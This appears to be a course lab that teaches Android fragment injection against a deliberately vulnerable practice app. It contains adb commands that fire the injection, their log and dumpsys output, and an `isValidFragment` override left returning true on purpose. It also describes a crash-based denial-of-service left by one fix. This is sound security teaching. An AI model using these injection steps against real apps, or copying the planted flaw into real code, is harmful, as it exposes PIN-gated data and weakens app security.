# Lab 01 — Land the classic

> **Difficulty:** Beginner
> **Time:** 45–60 minutes
> **You will need:** an Android device or emulator you own, `adb`, an Android SDK with build-tools
> and a JDK, and the two apps from [`../examples/`](../examples/build.sh).
> **Prerequisite:** none beyond being able to run `adb`. [30-Activities](../../30-Activities/README.md)
> lab 01 is useful but not required.

---

## Why this lab exists

Fragment injection is described in a hundred articles, and almost all of them are secondhand accounts
of a 2013 disclosure. This lab makes you produce the primary evidence yourself, on a modern device,
in about an hour — and, just as importantly, makes you produce the **control** alongside it, because
a demonstration with no control is a story.

By the end you will have four artefacts a report can be built from:

1. an attacker application, with **zero permissions**, causing a victim application to construct and
   display a screen that its own developer put behind a PIN;
2. the same attacker being **refused** by the hardened counterpart;
3. the runtime state of the victim showing the injected Fragment attached to the wrong Activity;
4. the same result read three independent ways — logcat, `dumpsys`, and the screen — so that no
   single reading has to be trusted.

> `../examples/victim-app/` is deliberately vulnerable. `../examples/attacker-app/` exists to attack
> it and nothing else: it requests **no permissions** and hard-codes `com.pentest.ch31.victim` as its
> only target, so it cannot be aimed elsewhere without editing and rebuilding it. Install both on a
> device you own and remove them when you are finished. See
> [SECURITY.md](../../SECURITY.md) for the handling rules.

---

## Objectives

1. Build and install two APKs without Gradle.
2. Establish the **intended** behaviour first: the login screen, the PIN, the admin panel.
3. Reach the admin panel without the PIN, from an ordinary app uid.
4. Show the control: the same attack refused by the hardened Activity, and the harmless Fragment
   still loading through the vulnerable one.
5. Read the evidence three ways and explain what each reading does and does not prove.
6. Write the finding, with its precondition, in two sentences.

---

## Background in ninety seconds

`android.preference.PreferenceActivity` is a platform class for building settings screens. Since API
11 it has accepted an Intent extra, `:android:show_fragment`, naming a Fragment class to display, and
it instantiates that class **reflectively** — by name, from a string.

Since API 19 the platform asks the subclass for permission first, through a method called
`isValidFragment(String)`. The base implementation returns `true` for apps targeting below API 19 and
**throws** for everything else, which forces a modern subclass to write an override. It does not
force the override to check anything.

The victim app's `SettingsActivity` writes the override that makes the crash go away:

```java
@Override
protected boolean isValidFragment(String fragmentName) {
    return true;
}
```

That is the whole vulnerability. [README §3.9](../README.md) has the platform's side of it, measured
out of the device's own `framework.jar`.

---

## Setup

### 1. Identify the device before you trust anything

```bash
# host
adb devices -l
adb shell getprop ro.product.model
adb shell getprop ro.build.version.sdk
adb shell getprop ro.build.version.release
```

Write these three values down. Every version-dependent claim you make later is a claim about *this*
device.

The reference run for this chapter:

```
emulator-5554  device product:sdk_gphone16k_x86_64 model:sdk_gphone16k_x86_64 device:emu64xa16k
sdk_gphone16k_x86_64
35
15
```

### 2. Check the screen is unlocked

```bash
# host
adb shell "dumpsys trust" | grep -o "deviceLocked=[01]"
```

`deviceLocked=0` means unlocked. Some builds silently refuse **app-originated** Activity starts while
the keyguard is up, so half your commands will work (the ones from `adb shell`) and half will not,
and the pattern looks random. [30 §7.8a](../../30-Activities/README.md) measured that behaviour;
do not disable the lock screen to work around it, just unlock the device.

### 3. Build and install

```bash
# host
cd ../examples
ANDROID_HOME=/path/to/your/sdk ./build.sh --install
```

Expected tail:

```
=== building victim-app ===
built /tmp/ch31-build/victim-app/victim-app.apk

=== building attacker-app ===
built /tmp/ch31-build/attacker-app/attacker-app.apk

installed com.pentest.ch31.victim
installed com.pentest.ch31.attacker
done. APKs are under /tmp/ch31-build -- nothing was written into the repository.
```

If `adb install` reports `INSTALL_FAILED_USER_RESTRICTED`, that is an OEM policy ("Install via USB"),
not a fault in the APK; `build.sh` detects it and retries through root. If it reports
`INSTALL_FAILED_DEPRECATED_SDK_VERSION`, you have set `TARGET_SDK` too low — that is lab 02's
experiment, not this one.

Confirm:

```bash
# host
adb shell pm list packages | grep ch31
```

```
package:com.pentest.ch31.attacker
package:com.pentest.ch31.victim
```

---

## Part 1 — Establish the intended behaviour

**Do this before the attack.** A lab that starts with the exploit teaches you a command; a lab that
starts with the intended behaviour teaches you what was bypassed.

### Step 1.1 — Seed the vault and look at the app

```bash
# host
adb logcat -c
adb shell am start -n com.pentest.ch31.victim/.MainActivity
adb logcat -d -s CH31
```

```
I CH31: Vault.seed: wrote /data/user/0/com.pentest.ch31.victim/files/vault.txt
I CH31: MainActivity.onCreate uid=10219 pid=14944
```

Note the uid. The victim runs as `10219` (yours will differ). That number is the sandbox boundary:
no other application can read that file.

Prove it:

```bash
# host -- as the shell (uid 2000), which is NOT the victim
adb shell "cat /data/user/0/com.pentest.ch31.victim/files/vault.txt"
```

```
cat: /data/user/0/com.pentest.ch31.victim/files/vault.txt: Permission denied
```

**The sandbox works.** Everything in this lab is about making the victim read that file for you, not
about reading it yourself. [21-App-Sandbox](../../21-App-Sandbox/README.md) owns the mechanism.

### Step 1.2 — Walk the intended route

On the device, tap **"Open the login screen (the intended route)"**, type the wrong PIN, and watch:

```bash
# host
adb logcat -d -s CH31 | tail -3
```

```
I CH31: LoginActivity: wrong PIN, refusing
```

Now type `4821`:

```
I CH31: LoginActivity: PIN accepted, adding AdminFragment
W CH31: ADMIN-FRAGMENT-REACHED secret=CH31{fragment_injection_skipped_the_login_screen}
```

**This is the behaviour the developer designed, and it is correct.** `LoginActivity` is not exported
(you will confirm that in step 1.3), the PIN check is real, and `AdminFragment` is only added after it
passes. Read `../examples/victim-app/LoginActivity.java`: there is nothing wrong with it.

### Step 1.3 — See what an ordinary app can see

The attacker app has a reconnaissance mode. Run it **from the attacker**, not from the shell:

```bash
# host
adb shell am start -S -n com.pentest.ch31.attacker/.InjectActivity --es attack probe
adb logcat -d -s CH31ATK
```

```
I CH31ATK: === probe ===
I CH31ATK: EXPORTED  com.pentest.ch31.victim.MainActivity
I CH31ATK: EXPORTED  com.pentest.ch31.victim.SettingsActivity
I CH31ATK: EXPORTED  com.pentest.ch31.victim.SettingsHardenedActivity
I CH31ATK: EXPORTED  com.pentest.ch31.victim.FragmentHostActivity
I CH31ATK: EXPORTED  com.pentest.ch31.victim.FragmentHostHardened
I CH31ATK: internal  com.pentest.ch31.victim.LoginActivity
```

Stop and read this list carefully, because it is the entire manifest-level view of the app and it is
**missing everything that matters**:

- `LoginActivity` is `internal`. The attacker cannot start it. The developer's control is intact.
- Nothing here mentions `AdminFragment`, or any Fragment, because **Fragments are not manifest
  components**. There is no attribute to read.
- Nothing distinguishes `SettingsActivity` from `SettingsHardenedActivity`. They differ by one method
  body, which is invisible from here.

> **Pentester's Note**
> If your assessment stops at the manifest, this app looks fine. That is [README §6.5](../README.md),
> and it is the reason chapter 32's manifest audit is a **necessary first step** and never the last
> one.

---

## Part 2 — Land the injection

### Step 2.1 — Fire it

```bash
# host -- force-stop first; see the trap note below
adb shell am force-stop com.pentest.ch31.attacker
adb shell am force-stop com.pentest.ch31.victim
adb logcat -c
adb shell am start -S -n com.pentest.ch31.attacker/.InjectActivity --es attack pref-inject
sleep 3
adb logcat -d -s CH31 CH31ATK
```

Expected:

```
I CH31ATK: === pref-inject ===
I CH31ATK: started com.pentest.ch31.victim.SettingsActivity
I CH31ATK:   :android:show_fragment = com.pentest.ch31.victim.AdminFragment
I CH31ATK: watch: adb logcat -s CH31
I CH31   : SettingsActivity.onCreate showFragment=com.pentest.ch31.victim.AdminFragment
I CH31   : isValidFragment(com.pentest.ch31.victim.AdminFragment) -> true (VULNERABLE)
W CH31   : ADMIN-FRAGMENT-REACHED secret=CH31{fragment_injection_skipped_the_login_screen}
```

**Look at the device.** The admin panel is on screen, with the secret rendered, inside an Activity
called "Settings", started by an app with no permissions, with no PIN typed.

> **Warning — the trap that will waste your afternoon**
> Without `-S` (or an explicit `am force-stop`), your *second* run of any attack will print nothing.
> `am start` compares Intents with `Intent.filterEquals()`, **which does not compare extras**, so an
> Intent that differs only in its payload is "the same Intent" and gets delivered to the already-
> running instance instead of starting a new one:
>
> ```
> Warning: Activity not started, intent has been delivered to currently running top-most instance.
> ```
>
> Every command in this chapter uses `-S`. Now you know why.

### Step 2.2 — The three lines that matter

Read the log again, slowly:

| Line | What it proves |
|---|---|
| `started com.pentest.ch31.victim.SettingsActivity` | The attacker reached an **exported** Activity. Normal, permitted, not a finding. |
| `isValidFragment(...AdminFragment) -> true` | The gate was consulted **and said yes**. This is the vulnerability, in one line. |
| `ADMIN-FRAGMENT-REACHED secret=...` | The victim read its own private file and displayed it. The sandbox was never crossed; the victim was persuaded. |

### Step 2.3 — Confirm the vantage

A result you obtained from `adb shell` is a claim about the **shell**, which holds privileges no app
has. Check which uid actually made the call:

```bash
# host
adb logcat -d | grep "ActivityTaskManager: START" | grep ch31 | tail -3
```

```
START u0 {flg=0x10000000 cmp=com.pentest.ch31.attacker/.InjectActivity (has extras)} ... from uid 2000
START u0 {flg=0x10000000 cmp=com.pentest.ch31.victim/.SettingsActivity (has extras)} ... from uid 10220
```

Two starts. The shell (uid **2000**) started the *attacker*; the attacker (uid **10220**) started the
*victim*. **Only the second line supports a finding.** If you had run

```bash
adb shell am start -n com.pentest.ch31.victim/.SettingsActivity --es ":android:show_fragment" ...
```

you would have proved that `shell` can do it, which is not interesting — the shell can start
non-exported Activities too.

---

## Part 3 — The controls

A single successful attack is an anecdote. Three more runs turn it into evidence.

### Step 3.1 — Control A: the harmless Fragment still loads

```bash
# host
adb shell am start -S -n com.pentest.ch31.attacker/.InjectActivity --es attack control
adb logcat -d -s CH31
```

```
I CH31: FragmentHostActivity.onCreate name=com.pentest.ch31.victim.PublicFragment mode=null
I CH31: PUBLIC-FRAGMENT-REACHED (this one is harmless)
```

This proves the app is not broken. The mechanism works as designed for the Fragment it is
designed for; the fault is the absence of a boundary, not the presence of a bug.

### Step 3.2 — Control B: the hardened Activity refuses

```bash
# host
adb shell am force-stop com.pentest.ch31.victim
adb logcat -c
adb shell am start -S -n com.pentest.ch31.attacker/.InjectActivity --es attack pref-hardened
sleep 3
adb logcat -d | grep -E "isValidFragment|IllegalArgumentException|FATAL"
```

```
E AndroidRuntime: FATAL EXCEPTION: main
E AndroidRuntime: Caused by: java.lang.IllegalArgumentException:
    Invalid fragment for this activity: com.pentest.ch31.victim.AdminFragment
        at android.preference.PreferenceActivity.switchToHeaderInner(PreferenceActivity.java:1241)
        at android.preference.PreferenceActivity.switchToHeader(PreferenceActivity.java:1277)
        at android.preference.PreferenceActivity.onCreate(PreferenceActivity.java:601)
        at com.pentest.ch31.victim.SettingsHardenedActivity.onCreate(SettingsHardenedActivity.java:51)
```

**Two things happened and you should be uncomfortable with one of them.**

The good news: `AdminFragment` was not loaded. The allowlist worked, and the refusal came from the
platform rather than from the app, which is a strong place for a control to live.

The bad news: **the victim application crashed.** An "app keeps stopping" dialog is on screen. Any
installed application can produce that, on demand, as often as it likes. The fix stopped the data
disclosure and left a denial-of-service primitive, because `switchToHeaderInner` throws an
`IllegalArgumentException` out of `onCreate` and nothing catches it.

That is [README §5.4](../README.md), and it is the part of this chapter that contradicts the standard
advice. "Override `isValidFragment` with an allowlist" is not a complete fix. The complete fix is not
to extend `PreferenceActivity`.

### Step 3.3 — Control C: the closed key map refuses quietly

```bash
# host
adb shell am start -S -n com.pentest.ch31.attacker/.InjectActivity --es attack host-hardened
adb logcat -d -s CH31 CH31ATK
```

```
I CH31ATK: started com.pentest.ch31.victim.FragmentHostHardened with screen=com.pentest.ch31.victim.AdminFragment
I CH31ATK: expect: 'refused' in logcat, and the Activity finishing
W CH31   : FragmentHostHardened: refused screen=com.pentest.ch31.victim.AdminFragment
```

No crash. No dialog. A logged refusal and a `finish()`. Compare
`../examples/victim-app/FragmentHostHardened.java` with
`../examples/victim-app/SettingsHardenedActivity.java`: the first accepts a **key**, the second
accepts a **class name** and filters it. That difference is the whole of
[README §5.2](../README.md)'s "fix 1 versus fix 2" table.

---

## Part 4 — Read the evidence three ways

One reading can be wrong. Three agreeing is a finding.

### Reading 1 — logcat

You have this already. Its weakness: it only works because the victim app was written to log. A real
app may log nothing, and then a successful injection is silent.

### Reading 2 — the live Fragment state

Re-run the injection, then:

```bash
# host
adb shell am force-stop com.pentest.ch31.victim
adb shell am start -n com.pentest.ch31.victim/.MainActivity ; sleep 2
adb shell am start -S -n com.pentest.ch31.attacker/.InjectActivity --es attack pref-inject ; sleep 3
adb shell "dumpsys activity com.pentest.ch31.victim" | grep -A8 "Active Fragments"
```

```
      Active Fragments in 713e4af:
        #0: AdminFragment{ff51365 #0 id=0x1020458}
          mFragmentId=#1020458 mContainerId=#1020458 mTag=null
          mState=5 mIndex=0 mWho=android:fragment:0 mBackStackNesting=0
          mFragmentManager=FragmentManager{713e4af in HostCallbacks{17fe0bc}}
      Added Fragments:
        #0: AdminFragment{ff51365 #0 id=0x1020458}
```

This works on **any** app, logging or not. Four things to read out of it:

- `AdminFragment` is attached to `SettingsActivity` — look a few lines up in the dump for the
  `ACTIVITY` header. In the design it belongs to `LoginActivity`.
- `mContainerId=#1020458` is the framework's internal preferences container, `0x01020458`. That
  constant appears in `PreferenceActivity.switchToHeaderInner`'s bytecode
  ([README §4.2](../README.md)) — the runtime and the disassembly agree.
- `mState=5` is `RESUMED`. On screen, not merely constructed.
- `mTag=null` — the platform path does not tag. An app's own navigation usually does, so an untagged
  Fragment among tagged ones is worth a second look.

### Reading 3 — the screen

Take a screenshot:

```bash
# host
adb exec-out screencap -p > /tmp/ch31-injected.png
```

An admin panel, in an Activity titled as settings, with the secret visible. This is the reading a
non-technical reader of your report will understand, and it is the weakest evidence of the three
because it does not show *how* the screen got there. Use all three.

---

## Success criteria

You have finished when you can **show**, not assert:

- [ ] The device model, release and API level you tested on, captured from `getprop`.
- [ ] `Permission denied` when the shell tries to read the victim's private file — the sandbox holds.
- [ ] The intended route working: wrong PIN refused, correct PIN admitting.
- [ ] The `probe` output showing `LoginActivity` as **internal**, and no Fragment named anywhere.
- [ ] The injection landing, with the three log lines of step 2.2.
- [ ] The `ActivityTaskManager: START ... from uid 10xxx` line proving an **app**, not the shell,
      made the call.
- [ ] Control A: `PublicFragment` still loading through the vulnerable host.
- [ ] Control B: the hardened Activity refusing **and crashing**, with the stack trace.
- [ ] Control C: the key-map host refusing without crashing.
- [ ] The `dumpsys` capture showing `AdminFragment` under `SettingsActivity`.

---

## Write the finding

Two sentences, with the precondition in the first one. Something like:

> **Exported `SettingsActivity` loads any Fragment named in the `:android:show_fragment` extra (any
> installed application; no permissions required).** A zero-permission app caused the victim to
> construct and display `AdminFragment`, which renders data the application otherwise gates behind a
> PIN entered in the non-exported `LoginActivity`; the same Intent against `SettingsHardenedActivity`
> was correctly refused, which isolates the defect to `SettingsActivity.isValidFragment` returning
> `true` unconditionally.

Note what that does **not** claim. It does not say the attacker read the data — the *victim*
displayed it. Getting it back to the attacker is a separate step and a separate finding
([README §5.7](../README.md)). Over-claiming here is the most common way this bug class is reported
badly.

---

## Troubleshooting

| Symptom | Cause | Fix |
|---|---|---|
| Second and later attacks print nothing | `am start` delivered to the running instance; `filterEquals` ignores extras | Use `-S`, or `am force-stop` between runs |
| `am start` succeeds but nothing happens | A permission-review dialog or the keyguard absorbed it | `adb shell "dumpsys window \| grep mCurrentFocus"`; unlock the device |
| `INSTALL_FAILED_USER_RESTRICTED` | OEM "Install via USB" policy | `build.sh` retries via root; or enable the toggle |
| `probe` says the victim is not installed | Package visibility on API 30+ | The attacker's manifest declares `<queries>`; make sure you rebuilt after any edit |
| No `CH31` lines at all | Wrong package running, or logcat buffer cleared after the event | `adb logcat -d -s CH31:V CH31ATK:V` without `-c` first |
| The victim crashes on `pref-inject` rather than injecting | You are running the `TARGET_SDK=17` build, or you targeted `LegacySettingsActivity` | That is lab 02. Rebuild with the default `TARGET_SDK=35` |

---

## Clean up

```bash
# host
cd ../examples && ./build.sh --uninstall
adb shell pm list packages | grep ch31        # expect nothing
```

---

## Where to go next

- [Lab 02 — Is it still exploitable?](lab-02-is-it-still-exploitable.md) turns the question you have
  just answered for one app into a question about your **device**: what does the platform actually
  do, and which of the three gate states can you reach?
- [README §5.4](../README.md) for the crash you produced in control B, which is a finding in its own
  right.
- [30-Activities lab 03](../../30-Activities/labs/lab-03-deputy-grant-laundering.md) for the
  neighbouring class: an exported Activity that forwards an *Intent* rather than instantiating a
  *class*.
